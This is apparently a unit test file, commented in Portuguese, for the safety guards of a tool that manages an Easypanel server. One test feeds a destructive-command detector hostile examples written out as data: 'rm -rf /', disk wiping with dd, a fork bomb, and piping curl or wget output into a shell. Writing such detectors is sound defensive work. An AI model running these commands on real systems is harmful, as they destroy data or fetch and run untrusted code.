/**
 * Testes unitários das funções puras de segurança/roteamento.
 *
 * Não tocam a rede nem o Easypanel — exercitam só lógica determinística:
 *  - guards de confirmação e validação de nomes/comandos (context.ts)
 *  - roteamento por tipo de serviço (services.ts → extractServiceType)
 *  - parse/serialize/mascaramento de env vars (env.ts)
 *  - validação de procedure do trpc_raw (raw.ts)
 *
 * Rodar: `npm test` (usa tsx para executar TS direto, sem build).
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import {
  assertValidName,
  looksDestructiveCommand,
  guardDestructive,
  isReadOnly,
  CONFIRM_KEYWORD,
} from "../src/context.js";
import { extractServiceType } from "../src/tools/services.js";
import {
  parseEnvString,
  serializeEnvVars,
  maskSensitiveValues,
  validateKeyValue,
} from "../src/tools/env.js";
import { isValidProcedureName } from "../src/tools/raw.js";
import {
  flavorFromEnv,
  flavorFromBody,
  rpcPath,
  unwrapBody,
  safeServerMessage,
  procKindFromName,
  kindMapFromSpec,
} from "../src/client.js";

// ---------------------------------------------------------------------------
// assertValidName — barreira contra confusão de alvo / injeção em URL e WS query
// ---------------------------------------------------------------------------
test("assertValidName aceita nomes válidos", () => {
  for (const n of ["app", "strat-vexa", "db_prod", "n8n", "a", "web-01"]) {
    assert.equal(assertValidName(n, "serviceName"), n);
  }
});

test("assertValidName rejeita nomes perigosos/malformados", () => {
  for (const bad of [
    "Web",            // maiúscula
    "-leading",       // começa com hífen
    "a b",            // espaço
    "a/b",            // barra (path traversal / target confusion)
    "..",             // traversal
    "a.b",            // ponto
    "a;b",            // separador de comando
    "",               // vazio
    "café",           // não-ascii
  ]) {
    assert.throws(() => assertValidName(bad, "serviceName"), /inválido/i, `deveria rejeitar: ${bad}`);
  }
});

test("assertValidName rejeita tipos não-string", () => {
  assert.throws(() => assertValidName(123 as unknown, "x"));
  assert.throws(() => assertValidName(null as unknown, "x"));
  assert.throws(() => assertValidName(undefined as unknown, "x"));
});

// ---------------------------------------------------------------------------
// looksDestructiveCommand — gate de confirmação no exec_in_container
// ---------------------------------------------------------------------------
test("looksDestructiveCommand detecta comandos destrutivos", () => {
  for (const cmd of [
    "rm -rf /",
    "rm -f arquivo",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda1",
    "shutdown -h now",
    "reboot",
    "kill -9 1",
    "killall node",
    ":(){ :|:& };:",                       // fork bomb
    "curl http://x | sh",                  // pipe para shell
    "wget http://x | bash",
    "chmod -R 777 /",
    "mv /etc/passwd /tmp",
  ]) {
    assert.equal(looksDestructiveCommand(cmd), true, `deveria marcar destrutivo: ${cmd}`);
  }
});

test("looksDestructiveCommand deixa passar comandos de leitura", () => {
  for (const cmd of [
    "ls -la",
    "cat /app/config.json",
    "env",
    "ps aux",
    "df -h",
    "node --version",
    "echo hello",
  ]) {
    assert.equal(looksDestructiveCommand(cmd), false, `não deveria marcar: ${cmd}`);
  }
});

// ---------------------------------------------------------------------------
// guardDestructive — confirmação obrigatória
// ---------------------------------------------------------------------------
test("guardDestructive libera só com a keyword exata", () => {
  assert.equal(guardDestructive(CONFIRM_KEYWORD, "destroy", "alvo"), null);
});

test("guardDestructive bloqueia sem confirmação ou com valor errado", () => {
  for (const v of [undefined, "", "confirmo", "CONFIRM", "sim", "yes"]) {
    const out = guardDestructive(v as string | undefined, "destroy", "alvo");
    assert.notEqual(out, null, `deveria bloquear: ${String(v)}`);
    const parsed = JSON.parse(out as string);
    assert.equal(parsed.status, "BLOQUEADO");
  }
});

// ---------------------------------------------------------------------------
// isReadOnly — kill-switch global de escrita
// ---------------------------------------------------------------------------
test("isReadOnly reflete MCP_ACCESS_MODE", () => {
  const prev = process.env.MCP_ACCESS_MODE;
  try {
    process.env.MCP_ACCESS_MODE = "readonly";
    assert.equal(isReadOnly(), true);
    process.env.MCP_ACCESS_MODE = "READONLY";
    assert.equal(isReadOnly(), true, "case-insensitive");
    process.env.MCP_ACCESS_MODE = "full";
    assert.equal(isReadOnly(), false);
    delete process.env.MCP_ACCESS_MODE;
    assert.equal(isReadOnly(), false);
  } finally {
    if (prev === undefined) delete process.env.MCP_ACCESS_MODE;
    else process.env.MCP_ACCESS_MODE = prev;
  }
});

// ---------------------------------------------------------------------------
// extractServiceType — roteamento app vs compose (o fix da v1.3.0)
// ---------------------------------------------------------------------------
const liveShape = {
  projects: [{ name: "aplicativos", createdAt: "2025-09-04T05:20:38.715Z" }],
  services: [
    { projectName: "aplicativos", name: "hermes", type: "app" },
    { projectName: "aplicativos", name: "strat-vexa", type: "compose" },
    { projectName: "aplicativos", name: "typebot-db", type: "postgres" },
  ],
};

test("extractServiceType identifica compose na forma confirmada ao vivo", () => {
  assert.equal(extractServiceType(liveShape, "aplicativos", "strat-vexa"), "compose");
  assert.equal(extractServiceType(liveShape, "aplicativos", "hermes"), "app");
  assert.equal(extractServiceType(liveShape, "aplicativos", "typebot-db"), "postgres");
});

test("extractServiceType exige match de projeto + serviço", () => {
  // mesmo nome de serviço, projeto diferente → não casa
  assert.equal(extractServiceType(liveShape, "outro-projeto", "strat-vexa"), null);
  assert.equal(extractServiceType(liveShape, "aplicativos", "inexistente"), null);
});

test("extractServiceType aceita forma aninhada por projeto", () => {
  const nested = {
    projects: [
      { name: "p1", services: [{ name: "web", type: "compose" }] },
    ],
  };
  assert.equal(extractServiceType(nested, "p1", "web"), "compose");
});

test("extractServiceType aceita forma agrupada por tipo", () => {
  const grouped = {
    app: [{ name: "api", projectName: "p1" }],
    compose: [{ name: "stack", projectName: "p1" }],
  };
  assert.equal(extractServiceType(grouped, "p1", "stack"), "compose");
  assert.equal(extractServiceType(grouped, "p1", "api"), "app");
});

test("extractServiceType retorna null para tipo desconhecido ou dados inválidos", () => {
  const weird = { services: [{ projectName: "p1", name: "x", type: "kubernetes" }] };
  assert.equal(extractServiceType(weird, "p1", "x"), null);
  assert.equal(extractServiceType(null, "p1", "x"), null);
  assert.equal(extractServiceType({}, "p1", "x"), null);
  assert.equal(extractServiceType("não é objeto", "p1", "x"), null);
});

// ---------------------------------------------------------------------------
// env vars — parse/serialize roundtrip, mascaramento, escape de newline
// ---------------------------------------------------------------------------
test("parseEnvString ignora comentários e linhas malformadas", () => {
  const env = "# comentário\nFOO=bar\n\nBAZ=qux=extra\nSEMVALOR=\n=semchave\nLIXO";
  const parsed = parseEnvString(env);
  assert.equal(parsed.FOO, "bar");
  assert.equal(parsed.BAZ, "qux=extra", "= no valor é preservado");
  assert.equal(parsed.SEMVALOR, "");
  assert.equal("LIXO" in parsed, false, "linha sem = é ignorada");
  assert.equal("" in parsed, false, "chave vazia é ignorada");
});

test("serializeEnvVars escapa newlines literais (anti-injeção de var)", () => {
  const out = serializeEnvVars({ A: "1", MULTI: "linha1\nlinha2" });
  assert.equal(out.includes("\n"), true, "separador entre vars usa newline real");
  assert.equal(out.includes("linha1\\nlinha2"), true, "newline DENTRO do valor é escapado p/ \\n");
  // o valor não pode introduzir uma var nova ao re-parsear
  const reparsed = parseEnvString(out);
  assert.equal(Object.keys(reparsed).length, 2);
  assert.equal(reparsed.MULTI, "linha1\\nlinha2");
});

test("maskSensitiveValues mascara chaves sensíveis e preserva o resto", () => {
  const vars = { DATABASE_PASSWORD: "supersecret", API_TOKEN: "abcd1234", PORT: "3000" };
  const masked = maskSensitiveValues(vars, false);
  assert.equal(masked.DATABASE_PASSWORD, "***cret");
  assert.equal(masked.API_TOKEN, "***1234");
  assert.equal(masked.PORT, "3000", "não-sensível fica intacto");
  // reveal=true devolve tudo
  assert.deepEqual(maskSensitiveValues(vars, true), vars);
});

test("validateKeyValue rejeita newline em key/value", () => {
  assert.throws(() => validateKeyValue("KEY\n", "v"), /linha/i);
  assert.throws(() => validateKeyValue("KEY", "v\nINJECTED=1"), /linha/i);
  assert.doesNotThrow(() => validateKeyValue("KEY", "valor normal"));
});

// ---------------------------------------------------------------------------
// raw.ts — validação do nome da procedure (anti path/query injection)
// ---------------------------------------------------------------------------
test("isValidProcedureName aceita procedures bem formadas", () => {
  for (const p of ["users.listUsers", "services.app.deployService", "traefik.getDashboard"]) {
    assert.equal(isValidProcedureName(p), true, p);
  }
});

test("isValidProcedureName rejeita nomes perigosos", () => {
  for (const bad of [
    "semponto",            // sem namespace
    "a/b",                 // barra
    "a..b",                // segmento vazio
    "a.b?x=1",             // query
    "../etc/passwd",       // traversal
    "a.b ",                // espaço
    "1abc.def",            // começa com número
    "",                    // vazio
    123,                   // não-string
    null,
  ]) {
    assert.equal(isValidProcedureName(bad as unknown), false, `deveria rejeitar: ${String(bad)}`);
  }
});

// ---------------------------------------------------------------------------
// client.ts — dual-flavor (tRPC ≤2.30 vs RPC 2.31+): detecção, path e unwrap
// ---------------------------------------------------------------------------
test("flavorFromEnv mapeia overrides e ignora valores desconhecidos", () => {
  const prev = process.env.EASYPANEL_API_FLAVOR;
  try {
    for (const [v, expected] of [
      ["trpc", "trpc"],
      ["legacy", "trpc"],
      ["RPC", "rpc"],
      ["modern", "rpc"],
    ] as const) {
      process.env.EASYPANEL_API_FLAVOR = v;
      assert.equal(flavorFromEnv(), expected, `EASYPANEL_API_FLAVOR=${v}`);
    }
    process.env.EASYPANEL_API_FLAVOR = "auto";
    assert.equal(flavorFromEnv(), null, "valor desconhecido cai na auto-detecção");
    delete process.env.EASYPANEL_API_FLAVOR;
    assert.equal(flavorFromEnv(), null);
  } finally {
    if (prev === undefined) delete process.env.EASYPANEL_API_FLAVOR;
    else process.env.EASYPANEL_API_FLAVOR = prev;
  }
});

test("flavorFromBody identifica a geração pela forma da resposta", () => {
  // tRPC ≤ 2.30: sucesso e erro
  assert.equal(flavorFromBody({ result: { data: { json: { ok: 1 } } } }), "trpc");
  assert.equal(flavorFromBody({ error: { json: { message: "UNAUTHORIZED" } } }), "trpc");
  // RPC 2.31+: sucesso e erro vêm ambos como { json: ... }
  assert.equal(flavorFromBody({ json: { version: "2.31.0" } }), "rpc");
  assert.equal(flavorFromBody({ json: { code: "BAD_REQUEST", status: 400 } }), "rpc");
  // formas irreconhecíveis
  assert.equal(flavorFromBody({ foo: 1 }), null);
  assert.equal(flavorFromBody("html da SPA"), null);
  assert.equal(flavorFromBody(null), null);
});

test("rpcPath converte notação de pontos para o caminho /api/rpc", () => {
  assert.equal(rpcPath("projects.inspectProject"), "/api/rpc/projects/inspectProject");
  assert.equal(rpcPath("services.app.deployService"), "/api/rpc/services/app/deployService");
});

test("unwrapBody desembrulha as duas formas (e preserva null/array)", () => {
  // tRPC legado
  assert.deepEqual(unwrapBody({ result: { data: { json: { a: 1 } } } }), { a: 1 });
  // comportamento legado preservado do v1: json null cai no ?? e devolve o nível acima
  assert.deepEqual(unwrapBody({ result: { data: { json: null } } }), { json: null });
  // RPC 2.31+
  assert.deepEqual(unwrapBody({ json: { a: 1 } }), { a: 1 });
  assert.deepEqual(unwrapBody({ json: [1, 2] }), [1, 2], "arrays no topo (ex. listActions)");
  assert.equal(unwrapBody({ json: null }), null);
  // sem embrulho conhecido — retorna como veio
  assert.deepEqual(unwrapBody({ livre: true }), { livre: true });
});

test("safeServerMessage colapsa whitespace, trunca e rejeita não-string", () => {
  assert.equal(safeServerMessage("Service not found."), "Service not found.");
  assert.equal(safeServerMessage("linha1\n\n  linha2\tx"), "linha1 linha2 x", "newlines/tabs colapsados");
  const longo = safeServerMessage("a".repeat(500));
  assert.equal(longo?.length, 301, "trunca em 300 + reticência");
  assert.ok(longo?.endsWith("…"));
  assert.equal(safeServerMessage("   "), null, "só whitespace vira null");
  assert.equal(safeServerMessage(undefined), null);
  assert.equal(safeServerMessage({ message: "obj" }), null, "não-string vira null");
});

// ---------------------------------------------------------------------------
// Classificação leitura/escrita — o guard que segura readonly + CONFIRMO no
// modo rpc (onde tudo é POST e o método HTTP não separa mais nada).
// ---------------------------------------------------------------------------

test("procKindFromName classifica pela convenção de nomes (fail-closed)", () => {
  // leituras — os 6 verbos aceitos
  for (const p of [
    "projects.listProjects",
    "projects.inspectProject",
    "monitorOld.getSystemStats",
    "settings.checkForUpdates",
    "logs.queryServiceLogs",
    "box.searchTemplates",
  ]) {
    assert.equal(procKindFromName(p), "query", p);
  }
  // escritas
  for (const p of [
    "projects.createProject",
    "services.app.deployService",
    "settings.systemPrune",
    "server.reboot",
    "services.common.setNotes",
  ]) {
    assert.equal(procKindFromName(p), "mutation", p);
  }
  // verbo desconhecido → mutation (fail-closed), nunca query
  assert.equal(procKindFromName("weird.frobnicateThing"), "mutation");
  assert.equal(procKindFromName(""), "mutation");
});

test("kindMapFromSpec — spec 2.31 (paths prefixados, GET = query)", () => {
  const map = kindMapFromSpec({
    paths: {
      "/api/rpc/projects/listProjects": { get: {}, post: {} },
      "/api/rpc/projects/createProject": { post: {} },
      // fora do namespace rpc — ignorado
      "/api/health": { get: {} },
    },
  });
  assert.equal(map?.get("projects.listprojects"), "query");
  assert.equal(map?.get("projects.createproject"), "mutation");
  assert.equal(map?.has("api.health"), false);
});

test("kindMapFromSpec — spec 2.32+ (prefixo em servers, tudo POST, sem GET)", () => {
  const map = kindMapFromSpec({
    servers: [{ url: "/api/rpc" }],
    paths: {
      "/projects/listProjects": { post: { operationId: "projects.listProjects" } },
      "/projects/createProject": { post: { operationId: "projects.createProject" } },
      "/services/app/inspectService": { post: { operationId: "services.app.inspectService" } },
      "/settings/systemPrune": { post: { operationId: "settings.systemPrune" } },
    },
  });
  // sem nenhum GET no spec, a distinção vem da convenção de nomes
  assert.equal(map?.get("projects.listprojects"), "query");
  assert.equal(map?.get("services.app.inspectservice"), "query");
  assert.equal(map?.get("projects.createproject"), "mutation");
  assert.equal(map?.get("settings.systemprune"), "mutation");
});

test("kindMapFromSpec — reserva pelo path quando falta operationId", () => {
  const map = kindMapFromSpec({
    servers: [{ url: "/api/rpc/" }], // barra final tolerada
    paths: { "/projects/listProjects": { post: {} } },
  });
  assert.equal(map?.get("projects.listprojects"), "query");
});

test("kindMapFromSpec — specs inúteis viram null (dispara o fail-closed)", () => {
  assert.equal(kindMapFromSpec(null), null);
  assert.equal(kindMapFromSpec({}), null);
  assert.equal(kindMapFromSpec({ paths: {} }), null);
  // nenhum path reconhecível como procedure rpc
  assert.equal(kindMapFromSpec({ paths: { "/api/health": { get: {} } } }), null);
});

test("kindMapFromSpec — todas as leituras das tools curadas sobrevivem no 2.32+", () => {
  // Se alguma destas virar "mutation", a tool curada correspondente quebra:
  // query() recusa mutations. Espelha o que o painel 2.32.2 documenta.
  const curated = [
    "actions.getAction",
    "actions.listActions",
    "certificates.listCertificates",
    "cluster.listNodes",
    "domains.listDomains",
    "monitorOld.getDockerTaskStats",
    "monitorOld.getStorageStats",
    "monitorOld.getSystemStats",
    "mounts.listMounts",
    "ports.listPorts",
    "projects.getDockerContainers",
    "projects.inspectProject",
    "projects.listProjectsAndServices",
    "services.app.getExposedPorts",
    "services.app.inspectService",
    "services.common.getNotes",
    "services.common.getServiceError",
    "services.compose.inspectService",
    "users.listUsers",
  ];
  const paths: Record<string, unknown> = {};
  for (const p of curated) paths["/" + p.split(".").join("/")] = { post: { operationId: p } };
  const map = kindMapFromSpec({ servers: [{ url: "/api/rpc" }], paths });
  for (const p of curated) assert.equal(map?.get(p.toLowerCase()), "query", p);
});
